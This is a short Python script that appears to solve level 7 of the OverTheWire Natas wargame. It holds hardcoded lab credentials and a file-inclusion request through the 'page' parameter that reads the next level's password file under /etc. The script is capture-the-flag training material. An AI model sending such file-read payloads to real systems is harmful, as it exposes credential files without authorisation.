import requests

user_name = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url = f"http://{user_name}.natas.labs.overthewire.org"

session = requests.Session()

response = session.get(url + "/index.php?page=/etc/natas_webpass/natas8", auth = (user_name, password))
#response = session.post(url, data= {"secret" : "FOEIUWGHFEEUHOFUOIU", "submit" : "submit"}, auth =  (user_name, password))

content = response.text

print(content)